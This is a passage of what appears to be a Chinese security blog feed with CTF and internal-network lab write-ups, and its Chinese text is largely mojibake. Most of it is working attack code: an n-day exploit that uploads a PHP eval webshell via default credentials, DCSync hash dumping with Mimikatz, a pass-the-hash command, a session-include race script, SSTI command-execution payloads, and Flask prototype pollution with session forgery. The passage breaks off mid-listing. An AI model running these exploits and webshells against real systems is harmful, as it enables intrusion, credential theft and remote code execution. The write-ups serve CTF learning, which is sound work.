class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_agent -c ip:port -s 654321 --reconnect 8</span><br></pre></td></tr></table></figure><p>è¦ä»€ä¹ˆç«¯å£ï¼Œè®°å¾—å…ˆåœ¨vpsä¸Šé¢å¼€ä¸€ä¸‹</p><p><img src="/../images/achieve/2025/12/image-20251203113446801.png" alt="image-20251203113446801"></p><p>æ­å»ºæˆåŠŸï¼Œç„¶ååœ¨vpsä¸Šæ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line">socks portè¿™ä¸ªç«¯å£ä¹Ÿæ˜¯è‡ªå·±å®š</span><br></pre></td></tr></table></figure><p>ç„¶åé…ç½®ä¸€ä¸‹ä»£ç†æœåŠ¡å™¨</p><p><img src="/../images/achieve/2025/12/image-20251203114039724.png" alt="image-20251203114039724"></p><p>ç›¸å½“äºæˆ‘ä»¬ç°åœ¨å°±æ˜¯ä»¥ip:port2çš„èº«ä»½å»è®¿é—®å†…ç½‘</p><p><img src="/../images/achieve/2025/12/image-20251203114225521.png" alt="image-20251203114225521"></p><p>è¯´æ˜¯ä¸€ä¸ªndayï¼Œæ‹¿inferå“¥å“¥çš„è„šæœ¬æ¥æ‰“ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;socks5://ip:port&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);&quot;</span>)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">session.post(url1, data=data1, proxies=proxy)</span><br><span class="line">res = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;, proxies=proxy)</span><br><span class="line">os.remove(<span class="string">&#x27;1.php&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filepath = <span class="built_in">str</span>(res.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = res.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(filepath)</span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">session.get(url3, proxies=proxy)</span><br><span class="line">res = session.post(url_pre + filepath,data=&#123;<span class="string">&quot;Infernity&quot;</span>:<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125;, proxies=proxy)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>ç„¶åèšå‰‘è¿æ¥ä¸€ä¸‹ï¼Œèšå‰‘ä¹Ÿè¦é…ç½®å¥½ä»£ç†ï¼Œç„¶åå°±æ‹¿ä¸‹è¿™å°æœºå­äº†</p><p><code>dir flag* /s</code>ç”¨<code>/s</code>é€’å½’æœç´¢ä¸€ä¸‹</p><p><img src="/../images/achieve/2025/12/image-20251203115244968.png" alt="image-20251203115244968"></p><p>æ‹¿åˆ°ç¬¬äºŒæ®µflag</p><h3 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h3><p>æ¥ç€å¼€å§‹æ‰“æ°¸æ’ä¹‹è“</p><p><img src="/../images/achieve/2025/12/478eae8c-4932-4a70-b63a-809c1e2b6e72.png" alt="478eae8c-4932-4a70-b63a-809c1e2b6e72"></p><h3 id="DCSycn"><a href="#DCSycn" class="headerlink" title="DCSycn"></a>DCSycn</h3><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line"></span><br><span class="line">kiwi<span class="built_in">_</span>cmd &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit</span><br></pre></td></tr></table></figure><blockquote><p>load kiwiï¼škiwi æ˜¯ Meterpreter çš„ä¸€ä¸ªæ‰©å±•æ¨¡å—ï¼Œä¸“é—¨ç”¨äº Windows å‡­æ®æå–ï¼ˆå¦‚æ˜æ–‡å¯†ç ã€NTLM å“ˆå¸Œã€Kerberos ç¥¨æ®ç­‰ï¼‰ã€‚</p><p>è¯¥å‘½ä»¤æ¨¡æ‹ŸåŸŸæ§åˆ¶å™¨ï¼ˆDCï¼‰çš„åŒæ­¥è¡Œä¸ºï¼Œä» xiaorang.lab åŸŸä¸­æå–æ‰€æœ‰ç”¨æˆ·ã€è®¡ç®—æœºã€ç»„ç­‰å¯¹è±¡çš„ NTLM å“ˆå¸Œ å’Œ Kerberos å¯†é’¥ï¼Œå¹¶ä»¥ CSV æ ¼å¼è¾“å‡ºã€‚</p></blockquote><p><img src="/../images/achieve/2025/12/image-20251203191423464.png" alt="image-20251203191423464"></p><p>è¿™é‡Œæˆ‘ä»¬æŠ“åˆ°äº†Administratorçš„hashï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨crackmapexecæ‰“hashä¼ é€’äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/12/image-20251203191955235.png" alt="image-20251203191955235"></p><p>è‡³æ­¤æ‹¿åˆ°flag</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ€»çš„æ¥è¯´è‡ªå·±è¿˜æ˜¯æœ‰äº›ä¸æ‡‚ï¼Œæœ‰å‡ ä¸ªåœ°æ–¹æ¯”å¦‚<code>DCSycn</code>æ”»å‡»é‚£éƒ¨åˆ†è‡ªå·±è¿˜ä¸æ˜¯ç‰¹åˆ«æ‡‚ï¼Œåé¢å»å­¦ä¸€ä¸‹ï¼Œä¹Ÿæ˜¯ä½“éªŒäº†ä¸€ä¸‹å†…ç½‘æ¸—é€çš„æµç¨‹</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DCYscnæ”»å‡» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow36Dç»ƒæ‰‹èµ›</title>
      <link href="/2025/11/30/ctfshow36D%E7%BB%83%E6%89%8B%E8%B5%9B/"/>
      <url>/2025/11/30/ctfshow36D%E7%BB%83%E6%89%8B%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸çŸ¥æ‰€æª-jpg"><a href="#ä¸çŸ¥æ‰€æª-jpg" class="headerlink" title="ä¸çŸ¥æ‰€æª.jpg"></a>ä¸çŸ¥æ‰€æª.jpg</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line"><span class="built_in">$</span>file must has test</span><br></pre></td></tr></table></figure><p>è¯•äº†ä¸€ä¸‹getä¼ å‚ï¼Œå¤§æ¦‚ç‡æ˜¯æ–‡ä»¶åŒ…å«äº†ï¼Œä¼ªåè®®ç›´æ¥æ‰“</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/test/resource=index.</span><br></pre></td></tr></table></figure><p>è¿™ç‚¹ä¹‹å‰lilctfé‡Œé¢ä¹Ÿç”¨åˆ°è¿‡ï¼Œtestä¸æ˜¯filterå¯é€‰çš„å‚æ•°ï¼Œæ‰€ä»¥æ˜¯ä¸å½±å“çš„ï¼Œä½†æ˜¯ä¸çŸ¥é“flagçš„æ–‡ä»¶åï¼Œåªèƒ½è¯•è¯•dataäº†</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?=eval(<span class="built_in">$</span><span class="built_in">_</span>GET[a]);?&gt;test<span class="built_in">&amp;</span>a=system(&#x27;tac /F*&#x27;);</span><br></pre></td></tr></table></figure><h2 id="easyshell"><a href="#easyshell" class="headerlink" title="easyshell"></a>easyshell</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username/password error&lt;html&gt;</span><br><span class="line">&lt;!--md5(<span class="built_in">$</span>secret.<span class="built_in">$</span>name)===<span class="built_in">$</span>pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>æŠ“åŒ…ç»™nameå’Œpasså…ˆéšä¾¿ä¼ ç‚¹ï¼Œå‘ç°cookieé‡Œé¢æœ‰ä¸ªhashå€¼ï¼Œè¯´ä¸å®šå°±æ˜¯md5($secret.$name)ï¼Œç»™passä¼ å…¥è¯•ä¸€è¯•ï¼Œokï¼Œæ‹¿åˆ°flflflflag.phpï¼Œæµè§ˆå™¨è®¿é—®ä¼šè·³è½¬ï¼Œæˆ‘ä»¬ä¾æ—§æŠ“åŒ…ï¼Œç„¶ååé¢å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>filterä¼ªåè®®æŠŠflflflflag.phpçš„æºç æ‹¿åˆ°ï¼Œæˆ‘æ˜¯å…ˆå°è¯•äº†æ—¥å¿—åŒ…å«ä½†æ˜¯ä¸€ç›´æ²¡å›æ˜¾ï¼Œå¯èƒ½å°±æ˜¯æ–‡ä»¶ä½ç½®é”™äº†ï¼è¯•ä¸‹sessionåŒ…å«</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid=<span class="string">&quot;flag&quot;</span></span><br><span class="line">url=<span class="string">&quot;http://0e1f2cca-e2cb-408d-8f4f-6c42b1999025.challenge.ctf.show/flflflflag.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):                          <span class="comment">#æ‰“å…¥sessionæ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">while</span> event.is_set():</span><br><span class="line">        f=io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">        r=session.post(</span><br><span class="line">            url=url,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;feii.txt&#x27;</span>,f)&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):                          <span class="comment">#è¯»å–sessionæ–‡ä»¶è¿›è¡Œæ¡ä»¶ç«äº‰</span></span><br><span class="line">    <span class="keyword">while</span> event.is_set():</span><br><span class="line"></span><br><span class="line">        r=session.get(url=url, params = &#123;<span class="string">&quot;file&quot;</span>:<span class="string">&quot;/tmp/sess_flag&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;feii.txt&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] æˆåŠŸå†™å…¥ï¼å“åº”ï¼š&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] ç»§ç»­å°è¯•...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> sess:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write,args=(sess,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(sess,)).start()</span><br></pre></td></tr></table></figure><p>å…ˆè¯•äº†æœ€ç®€å•çš„phpinfoï¼Œç›´æ¥å°±æ‹¿åˆ°äº†flagï¼Œç„¶ådisable_functionsæŠŠå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°éƒ½ç»™banäº†ï¼æˆ‘ç”¨scandiræ‰«æäº†ç›®å½•&#x2F;var&#x2F;log&#x2F;ä¸‹æ²¡æœ‰nginxä½†æ˜¯æœ‰ä¸ªapache2è¿™å°±ä¸æ‡‚äº†ï¼Œç„¶ååˆè¯•äº†&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.logï¼Œè¿™é‡Œé¢å¥½åƒæ²¡å†…å®¹</p><p>æœ€åå‘ç°è¿˜å¯ä»¥è¿™æ ·å†™é©¬ï¼Œåˆ©ç”¨fputså’Œfopen</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval(<span class="built_in">$</span><span class="built_in">_</span>POST[1]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨èšå‰‘çš„æ’ä»¶ç»•è¿‡ä¸€ä¸‹å°±å¥½äº†</p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
            <tag> sessionåŒ…å« </tag>
            
            <tag> phpå†™é©¬ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DSBCTFå•èº«æ¯2024</title>
      <link href="/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/"/>
      <url>/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/</url>
      
        <content type="html"><![CDATA[<h2 id="ç­¾åˆ°Â·å¥½ç©çš„PHP"><a href="#ç­¾åˆ°Â·å¥½ç©çš„PHP" class="headerlink" title="ç­¾åˆ°Â·å¥½ç©çš„PHP"></a>ç­¾åˆ°Â·å¥½ç©çš„PHP</h2><p>å°è€ƒç‚¹ï¼šæ•°å­—123å’Œå­—ç¬¦ä¸²123çš„md5æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯å¼ºæ¯”è¾ƒä¸ä¸€æ ·</p><h2 id="ezzz-ssti"><a href="#ezzz-ssti" class="headerlink" title="ezzz_ssti"></a>ezzz_ssti</h2><p>sstiæœ‰é•¿åº¦é™åˆ¶</p><p>åˆ©ç”¨<code>config</code>æ˜¯å­—å…¸çš„å­ç±»ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨updateæ–¹æ³•å°†æˆ‘ä»¬è¦å†™çš„payloadç»™å‚¨å­˜åˆ°configé‡Œé¢ï¼Œç„¶åå†å–å‡ºæ¥</p><p>ç›®æ ‡ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>.os.popen(&#x27;cat /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="comment">%set x=config.update(a=lipsum.__globals__)%&#125;#é•¿åº¦å¤ªé•¿äº†</span></span><br><span class="line">å¯ä»¥å…ˆæŠŠconfig.updateç»™å­˜ä¸€ä¸‹</span><br><span class="line">&#123;<span class="comment">%set x=config.update(a=config.update)%&#125;</span></span><br><span class="line">&#123;<span class="comment">%set x=config.a(b=lipsum.__globals__)%&#125;</span></span><br><span class="line">&#123;&#123;config.b.os.popen(&#x27;cat /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flag</p><h2 id="ez-inject"><a href="#ez-inject" class="headerlink" title="ez_inject"></a>ez_inject</h2><p>æ³¨å†Œè¿›å»</p><p><img src="/../images/achieve/2025/11/image-20251129185509255.png" alt="image-20251129185509255"></p><p><img src="/../images/achieve/2025/11/image-20251129185541908.png" alt="image-20251129185541908"></p><p>æç¤ºè¯´åˆ©ç”¨æ³¨å†Œå»è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ï¼Œè€Œä¸”æåˆ°äº†èº«ä»½ï¼Œæˆ‘ä»¬çœ‹çœ‹cookie</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJwdzUsKhDAQANGrhF4biPmM4lmE0GpnzCIJpBUR8e46U4u3rQtoXotPxIxfggHOsleBmQ-qIrL4147bvAVey3GpT6fIYC9t6PBlWmRvrZKatDPBOQra3GOGBiJ7XFLMMKgGdqaaMf0GrTZwP<span class="built_in">_</span>zzJOE.aSrQ5w.ktXLaj3P75GzmyN1QiItSA52NcI</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯sessionï¼Œå¤§æŠµå°±æ˜¯flaskçš„sessionä¼ªé€ äº†ï¼Œå¯†é’¥æç¤ºæˆ‘ä»¬å»æ±¡æŸ“<code>app.config.SECRET_KEY</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://2ee11bb0-05f6-4dda-865c-21b1c010b233.challenge.ctf.show/register&quot;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;config&quot;</span>:&#123;<span class="string">&quot;SECRET_KEY&quot;</span>:<span class="string">&quot;rufeii&quot;</span>&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url,json=payload)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯ä¼ªé€ session</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;is<span class="built_in">_</span>admin&#x27;: 1, &#x27;username&#x27;: &#x27;1&#x27;&#125;&quot; --secret &#x27;rufeii&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/11/image-20251129191712309.png" alt="image-20251129191712309"></p><p>ä¹‹åå°±æ˜¯sstiä¸éœ€è¦<code>&#123;&#123;&#125;&#125;</code>ï¼Œåº”è¯¥å°±è¿‡æ»¤äº†ç‚¹å…³é”®å­—å¾ˆå¥½æ‰“</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cycler[&#x27;<span class="built_in">_</span><span class="built_in">_</span>in&#x27;&#x27;it<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;<span class="built_in">_</span><span class="built_in">_</span>glo&#x27;&#x27;bals<span class="built_in">_</span><span class="built_in">_</span>&#x27;].os.popen(&#x27;ls /&#x27;).read()</span><br><span class="line">cycler[&#x27;<span class="built_in">_</span><span class="built_in">_</span>in&#x27;&#x27;it<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;<span class="built_in">_</span><span class="built_in">_</span>glo&#x27;&#x27;bals<span class="built_in">_</span><span class="built_in">_</span>&#x27;].os.popen(&#x27;nl /f*&#x27;).read()</span><br></pre></td></tr></table></figure><h3 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h3><p>æ±¡æŸ“çš„æ—¶å€™ç›´æ¥å°è¯•æ±¡æŸ“é™æ€ç›®å½•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3b889b74-472b-4490-8994-17e02fe934b1.challenge.ctf.show/register&quot;</span></span><br><span class="line"></span><br><span class="line">payload=&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;/&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, json=payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>æœ€åæˆ‘æŠŠæºç æ‹¿äº†ä¸€ä¸‹&#x2F;var&#x2F;www&#x2F;html&#x2F;app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 